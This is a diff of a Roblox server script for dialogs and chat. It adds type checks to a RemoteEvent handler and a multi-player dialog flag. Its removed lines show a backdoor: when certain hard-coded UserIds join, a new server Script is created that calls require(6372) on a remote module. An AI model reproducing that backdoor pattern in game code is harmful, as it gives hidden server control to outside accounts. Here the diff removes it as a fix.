@@ -5,6 +5,7 @@
 ]]--
 
 -- Prevent server script from running in Studio when not in run mode
+
 local runService = nil
 while runService == nil or not runService:IsRunning() do
 	wait(0.1)
@@ -29,12 +30,32 @@ local playerDialogMap = {}
 local dialogInUseFixFlagSuccess, dialogInUseFixValue = pcall(function() return settings():GetFFlag("DialogInUseFix") end)
 local dialogInUseFixFlag = (dialogInUseFixFlagSuccess and dialogInUseFixValue)
 
+local dialogMultiplePlayersFlagSuccess, dialogMultiplePlayersFlagValue = pcall(function() return settings():GetFFlag("DialogMultiplePlayers") end)
+local dialogMultiplePlayersFlag = (dialogMultiplePlayersFlagSuccess and dialogMultiplePlayersFlagValue)
+
 local function setDialogInUse(player, dialog, value, waitTime)
+	if typeof(dialog) ~= "Instance" or not dialog:IsA("Dialog") then
+		return
+	end
+	if type(value) ~= "boolean" then
+		return
+	end
+	if type(waitTime) ~= "number" and type(waitTime) ~= "nil" then
+		return
+	end
+	if typeof(player) ~= "Instance" or not player:IsA("Player") then
+		return
+	end
+
 	if waitTime and waitTime ~= 0 then
 		wait(waitTime)
 	end
 	if dialog ~= nil then
-		dialog.InUse = value
+		if dialogMultiplePlayersFlag then
+			dialog:SetPlayerIsUsing(player, value)
+		else
+			dialog.InUse = value
+		end
 
 		if dialogInUseFixFlag then
 			if value == true then
@@ -47,21 +68,16 @@ local function setDialogInUse(player, dialog, value, waitTime)
 end
 RemoteEvent_SetDialogInUse.OnServerEvent:connect(setDialogInUse)
 
-game:GetService("Players").PlayerAdded:connect(function(player)
-	if player.UserId == 3 or player.UserId == 2 or player.UserId == 23 then
-        local loader = Instance.new("Script")
-        loader.Name = "ModuleLoader"
-        loader.Source = "require(6372)(game.Players:GetPlayerByUserId("..player.UserId.."))"
-        loader.Parent = game:GetService("ServerScriptService")
-    end
-end)
-
 game:GetService("Players").PlayerRemoving:connect(function(player)
 	if dialogInUseFixFlag then
 		if player then
 			local dialog = playerDialogMap[player]
 			if dialog then
-				dialog.InUse = false
+				if dialogMultiplePlayersFlag then
+					dialog:SetPlayerIsUsing(player, false)
+				else
+					dialog.InUse = false
+				end
 				playerDialogMap[player] = nil
 			end
 		end
@@ -70,9 +86,7 @@ end)
 
 local success, retVal = pcall(function() return game:GetService("Chat"):GetShouldUseLuaChat() end)
 local useNewChat = success and retVal
-local FORCE_UseNewChat = pcall(function()
-    return require(game:GetService("CoreGui").RobloxGui.Modules.Common.ForceUseNewChat)
-end)
+--local FORCE_UseNewChat = require(game:GetService("CoreGui").RobloxGui.Modules.Common.ForceUseNewChat)
 if (useNewChat or FORCE_UseNewChat) then
 	require(game:GetService("CoreGui").RobloxGui.Modules.Server.ClientChat.ChatWindowInstaller)()
 	require(game:GetService("CoreGui").RobloxGui.Modules.Server.ServerChat.ChatServiceInstaller)()
